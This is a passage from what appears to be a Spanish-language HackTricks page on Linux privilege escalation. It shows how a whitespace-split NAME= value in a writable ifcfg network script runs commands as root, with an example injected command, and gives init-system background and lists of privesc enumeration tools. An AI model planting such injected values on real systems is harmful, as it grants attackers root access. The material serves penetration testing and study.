**Referencia de vulnerabilidad:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Si, por cualquier motivo, un usuario puede **escribir** un script `ifcf-<cualquier cosa>` en _/etc/sysconfig/network-scripts_ **o** puede **ajustar** uno existente, entonces tu **sistema está comprometido**.

Los scripts de red, _ifcg-eth0_ por ejemplo, se utilizan para conexiones de red. Se ven exactamente como archivos .INI. Sin embargo, son \~sourced\~ en Linux por Network Manager (dispatcher.d).

En mi caso, el atributo `NAME=` en estos scripts de red no se maneja correctamente. Si tienes **espacio en blanco en el nombre, el sistema intenta ejecutar la parte después del espacio en blanco**. Esto significa que **todo lo que esté después del primer espacio en blanco se ejecuta como root**.

Por ejemplo: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
### **init, init.d, systemd y rc.d**

El directorio `/etc/init.d` es el hogar de **scripts** para System V init (SysVinit), el **sistema clásico de gestión de servicios de Linux**. Incluye scripts para `start`, `stop`, `restart` y a veces `reload` servicios. Estos pueden ejecutarse directamente o a través de enlaces simbólicos encontrados en `/etc/rc?.d/`. Un camino alternativo en sistemas Redhat es `/etc/rc.d/init.d`.

Por otro lado, `/etc/init` está asociado con **Upstart**, una **gestión de servicios** más nueva introducida por Ubuntu, utilizando archivos de configuración para tareas de gestión de servicios. A pesar de la transición a Upstart, los scripts de SysVinit todavía se utilizan junto con las configuraciones de Upstart debido a una capa de compatibilidad en Upstart.

**systemd** surge como un moderno gestor de inicialización y servicios, ofreciendo características avanzadas como el inicio de demonios bajo demanda, gestión de automontaje y instantáneas del estado del sistema. Organiza archivos en `/usr/lib/systemd/` para paquetes de distribución y `/etc/systemd/system/` para modificaciones de administradores, agilizando el proceso de administración del sistema.

## Otros trucos

### Escalación de privilegios NFS

{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escape de Shells restringidos

{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage

{{#ref}}
cisco-vmanage.md
{{#endref}}

## Protecciones de seguridad del Kernel

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Más ayuda

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Herramientas de Privesc de Linux/Unix

### **Mejor herramienta para buscar vectores de escalación de privilegios locales en Linux:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumera vulnerabilidades del kernel en linux y MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (acceso físico):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilación de más scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## Referencias

- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)\\
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)\\
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)\\
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)\\
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)\\
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)\\
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)\\
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)\\
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)

{{#include ../../banners/hacktricks-training.md}}
